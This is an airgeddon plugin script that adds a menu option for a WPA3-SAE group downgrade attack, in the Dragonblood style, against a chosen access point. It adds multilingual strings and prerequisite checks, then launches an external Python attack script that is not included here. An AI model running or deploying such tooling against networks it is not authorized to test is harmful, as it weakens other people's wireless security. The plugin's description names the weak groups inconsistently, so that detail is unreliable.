#!/usr/bin/env bash
# ==============================================================================
# airgeddon plugin: WPA3-SAE Group Downgrade Attack
# ==============================================================================
# Based on: Dragonblood research.
# Compatible with airgeddon v12.0+
# All comments are in English as requested.
# ==============================================================================
# shellcheck disable=SC2034,SC2154

###### GENERIC PLUGIN VARS ######
plugin_name="WPA3-SAE Group Downgrade Attack"
plugin_description="Force weak MODP groups (2048/3072) on a WPA3-SAE AP"
plugin_author="Nuseo1"
plugin_enabled=1

###### PLUGIN REQUIREMENTS ######
plugin_minimum_ag_affected_version="12.0"
plugin_maximum_ag_affected_version=""
plugin_distros_supported=("*")
plugin_short_name="downgrade"

# ==============================================================================
# PREHOOK: Intercept menu selection (Correct hook name for v12.0+)
# ==============================================================================
# This function intercepts the user's menu input and routes the selection
# to the main downgrade option function.
function downgrade_prehook_hookable_wpa3_attacks_menu() {
    if [[ "${arr["ENGLISH",756]}" == *"WPA3 Group Downgrade attack"* ]]; then
        plugin_x="downgrade_option"
        plugin_x_under_construction=""
    elif [[ "${arr["ENGLISH",757]}" == *"WPA3 Group Downgrade attack"* ]]; then
        plugin_y="downgrade_option"
        plugin_y_under_construction=""
    elif [[ "${arr["ENGLISH",812]}" == *"WPA3 Group Downgrade attack"* ]]; then
        plugin_z="downgrade_option"
        plugin_z_under_construction=""
    fi
}

# ==============================================================================
# PREHOOK: Language strings (All 13 languages per string, airgeddon format)
# ==============================================================================
function downgrade_prehook_hookable_for_languages() {
    # Slot 756
    if [[ "${arr["ENGLISH",756]}" == *"WPA3 attack"* && "${arr["ENGLISH",756]}" == *"plugin"* ]]; then
        arr["ENGLISH",756]="6.  WPA3 Group Downgrade attack"
        arr["SPANISH",756]="6.  Ataque de degradación de grupo WPA3"
        arr["FRENCH",756]="6.  Attaque de dégradation de groupe WPA3"
        arr["CATALAN",756]="6.  Atac de degradació de grup WPA3"
        arr["PORTUGUESE",756]="6.  Ataque de downgrade de grupo WPA3"
        arr["RUSSIAN",756]="6.  Атака понижения группы WPA3"
        arr["GREEK",756]="6.  Επίθεση υποβάθμισης ομάδας WPA3"
        arr["ITALIAN",756]="6.  Attacco di downgrade di gruppo WPA3"
        arr["POLISH",756]="6.  Atak obniżania grupy WPA3"
        arr["GERMAN",756]="6.  WPA3 Group Downgrade Angriff"
        arr["TURKISH",756]="6.  WPA3 Grup Downgrade saldırısı"
        arr["ARABIC",756]="6.  هجوم تخفيض مجموعة WPA3"
        arr["CHINESE",756]="6.  WPA3 组降级攻击"
    # Slot 757
    elif [[ "${arr["ENGLISH",757]}" == *"WPA3 attack"* && "${arr["ENGLISH",757]}" == *"plugin"* ]]; then
        arr["ENGLISH",757]="7.  WPA3 Group Downgrade attack"
        arr["SPANISH",757]="7.  Ataque de degradación de grupo WPA3"
        arr["FRENCH",757]="7.  Attaque de dégradation de groupe WPA3"
        arr["CATALAN",757]="7.  Atac de degradació de grup WPA3"
        arr["PORTUGUESE",757]="7.  Ataque de downgrade de grupo WPA3"
        arr["RUSSIAN",757]="7.  Атака понижения группы WPA3"
        arr["GREEK",757]="7.  Επίθεση υποβάθμισης ομάδας WPA3"
        arr["ITALIAN",757]="7.  Attacco di downgrade di gruppo WPA3"
        arr["POLISH",757]="7.  Atak obniżania grupy WPA3"
        arr["GERMAN",757]="7.  WPA3 Group Downgrade Angriff"
        arr["TURKISH",757]="7.  WPA3 Grup Downgrade saldırısı"
        arr["ARABIC",757]="7.  هجوم تخفيض مجموعة WPA3"
        arr["CHINESE",757]="7.  WPA3 组降级攻击"
    # Slot 812
    elif [[ "${arr["ENGLISH",812]}" == *"WPA3 attack"* && "${arr["ENGLISH",812]}" == *"plugin"* ]]; then
        arr["ENGLISH",812]="8.  WPA3 Group Downgrade attack"
        arr["SPANISH",812]="8.  Ataque de degradación de grupo WPA3"
        arr["FRENCH",812]="8.  Attaque de dégradation de groupe WPA3"
        arr["CATALAN",812]="8.  Atac de degradació de grup WPA3"
        arr["PORTUGUESE",812]="8.  Ataque de downgrade de grupo WPA3"
        arr["RUSSIAN",812]="8.  Атака понижения группы WPA3"
        arr["GREEK",812]="8.  Επίθεση υποβάθμισης ομάδας WPA3"
        arr["ITALIAN",812]="8.  Attacco di downgrade di gruppo WPA3"
        arr["POLISH",812]="8.  Atak obniżania grupy WPA3"
        arr["GERMAN",812]="8.  WPA3 Group Downgrade Angriff"
        arr["TURKISH",812]="8.  WPA3 Grup Downgrade saldırısı"
        arr["ARABIC",812]="8.  هجوم تخفيض مجموعة WPA3"
        arr["CHINESE",812]="8.  WPA3 组降级攻击"
    fi

    # Plugin-specific message strings (keyed by custom key)
    arr["ENGLISH","downgrade_1"]="WPA3 Group Downgrade forces AP to accept weak MODP groups 22/23."
    arr["SPANISH","downgrade_1"]="El downgrade de grupo WPA3 fuerza al AP a aceptar grupos MODP débiles 22/23."
    arr["FRENCH","downgrade_1"]="Le downgrade de groupe WPA3 force le point d'accès à accepter les groupes MODP faibles 22/23."
    arr["CATALAN","downgrade_1"]="El downgrade de grup WPA3 força el punt d'accés a acceptar grups MODP febles 22/23."
    arr["PORTUGUESE","downgrade_1"]="O downgrade de grupo WPA3 força o AP a aceitar grupos MODP fracos 22/23."
    arr["RUSSIAN","downgrade_1"]="Downgrade группы WPA3 заставляет ТД принимать слабые группы MODP 22/23."
    arr["GREEK","downgrade_1"]="Το WPA3 Group Downgrade αναγκάζει το AP να αποδεχτεί αδύναμες ομάδες MODP 22/23."
    arr["ITALIAN","downgrade_1"]="Il downgrade di gruppo WPA3 forza l'AP ad accettare gruppi MODP deboli 22/23."
    arr["POLISH","downgrade_1"]="Downgrade grupy WPA3 zmusza AP do akceptacji słabych grup MODP 22/23."
    arr["GERMAN","downgrade_1"]="WPA3 Group Downgrade zwingt AP zur Annahme schwacher MODP-Gruppen 22/23."
    arr["TURKISH","downgrade_1"]="WPA3 Grup Downgrade, AP'yi zayıf MODP grupları 22/23 kabul etmeye zorlar."
    arr["ARABIC","downgrade_1"]="WPA3 Group Downgrade يجبر نقطة الوصول على قبول مجموعات MODP الضعيفة 22/23."
    arr["CHINESE","downgrade_1"]="WPA3 组降级强制接入点接受弱 MODP 组 22/23。"

    arr["ENGLISH","downgrade_2"]="This attack requires python3."
    arr["SPANISH","downgrade_2"]="Este ataque requiere python3."
    arr["FRENCH","downgrade_2"]="Cette attaque nécessite python3."
    arr["CATALAN","downgrade_2"]="Aquest atac requereix python3."
    arr["PORTUGUESE","downgrade_2"]="Este ataque requer python3."
    arr["RUSSIAN","downgrade_2"]="Для этой атаки требуется python3."
    arr["GREEK","downgrade_2"]="Αυτή η επίθεση απαιτεί python3."
    arr["ITALIAN","downgrade_2"]="Questo attacco richiede python3."
    arr["POLISH","downgrade_2"]="Ten atak wymaga python3."
    arr["GERMAN","downgrade_2"]="Dieser Angriff erfordert python3."
    arr["TURKISH","downgrade_2"]="Bu saldırı python3 gerektirir."
    arr["ARABIC","downgrade_2"]="يتطلب هذا الهجوم python3."
    arr["CHINESE","downgrade_2"]="此攻击需要 python3。"

    arr["ENGLISH","downgrade_3"]="Python attack script downgrade_attack.py not found."
    arr["SPANISH","downgrade_3"]="No se encontró el script python downgrade_attack.py."
    arr["FRENCH","downgrade_3"]="Le script python downgrade_attack.py est introuvable."
    arr["CATALAN","downgrade_3"]="No s'ha trobat l'script python downgrade_attack.py."
    arr["PORTUGUESE","downgrade_3"]="Script python downgrade_attack.py não encontrado."
    arr["RUSSIAN","downgrade_3"]="Python скрипт downgrade_attack.py не найден."
    arr["GREEK","downgrade_3"]="Το python script downgrade_attack.py δεν βρέθηκε."
    arr["ITALIAN","downgrade_3"]="Script python downgrade_attack.py non trovato."
    arr["POLISH","downgrade_3"]="Nie znaleziono skryptu python downgrade_attack.py."
    arr["GERMAN","downgrade_3"]="Python-Angriffsskript downgrade_attack.py nicht gefunden."
    arr["TURKISH","downgrade_3"]="Python saldırı betiği downgrade_attack.py bulunamadı."
    arr["ARABIC","downgrade_3"]="لم يتم العثور على سكربت بايثون downgrade_attack.py."
    arr["CHINESE","downgrade_3"]="未找到 Python 攻击脚本 downgrade_attack.py。"

    wpa3_hints+=("downgrade_1")
}

# ==============================================================================
# VALIDATION FUNCTIONS
# ==============================================================================
function python3_downgrade_script_validation() {
    if ! [ -f "${scriptfolder}${plugins_dir}downgrade_attack.py" ]; then
        echo
        language_strings "${language}" "downgrade_3" "red"
        language_strings "${language}" 115 "read"
        return 1
    fi
    return 0
}

function python3_downgrade_validation() {
    if ! hash python3 2> /dev/null; then
        echo
        language_strings "${language}" "downgrade_2" "red"
        language_strings "${language}" 115 "read"
        return 1
    fi
    python3="python3"
    return 0
}

# ==============================================================================
# MAIN ATTACK EXECUTION FUNCTION
# ==============================================================================
function downgrade_option() {
    # Pre-flight checks
    get_aircrack_version
    if ! validate_aircrack_wpa3_version; then
        echo
        language_strings "${language}" 763 "red"
        language_strings "${language}" 115 "read"
        return 1
    fi
    if ! python3_downgrade_validation; then return 1; fi
    if ! python3_downgrade_script_validation; then return 1; fi

    # Target validation
    if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]]; then
        echo
        language_strings "${language}" 125 "yellow"
        language_strings "${language}" 115 "read"
        if ! explore_for_targets_option "WPA3"; then return 1; fi
    fi
    if ! check_monitor_enabled "${interface}"; then
        echo
        language_strings "${language}" 14 "red"
        language_strings "${language}" 115 "read"
        return 1
    fi
    if ! validate_wpa3_network; then return 1; fi
    if ! validate_network_type "personal"; then return 1; fi

    # Execute attack
    echo
    language_strings "${language}" "downgrade_1" "blue"
    echo
    language_strings "${language}" 32 "green"
    echo
    language_strings "${language}" 33 "yellow"
    language_strings "${language}" 4 "read"
    exec_downgrade_attack
}

function exec_downgrade_attack() {
    # Set channel
    iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
    
    # Launch Python engine via airgeddon's manage_output
    recalculate_windows_sizes
    manage_output "+j -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g1_topright_window} -T \"WPA3 Downgrade Attack\"" \
        "${python3} ${scriptfolder}${plugins_dir}downgrade_attack.py ${bssid} ${channel} ${interface} ${language}" \
        "WPA3 Downgrade Attack" "active"
        
    wait_for_process "${python3} ${scriptfolder}${plugins_dir}downgrade_attack.py ${bssid} ${channel} ${interface} ${language}" \
        "WPA3 Downgrade Attack"
}

# ==============================================================================
# POSTHOOKS (optional)
# ==============================================================================
function downgrade_posthook_initialize_colors() { :; return 0; }
